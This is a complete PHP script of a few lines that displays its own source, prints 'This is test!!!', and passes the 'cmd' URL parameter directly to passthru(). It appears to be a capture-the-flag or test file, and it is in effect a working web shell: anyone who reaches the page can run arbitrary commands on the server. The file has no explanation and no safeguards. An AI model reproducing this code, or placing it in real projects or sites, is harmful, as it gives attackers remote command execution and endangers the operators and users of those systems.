<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
echo "This is test!!!";
passthru($cmd);
?>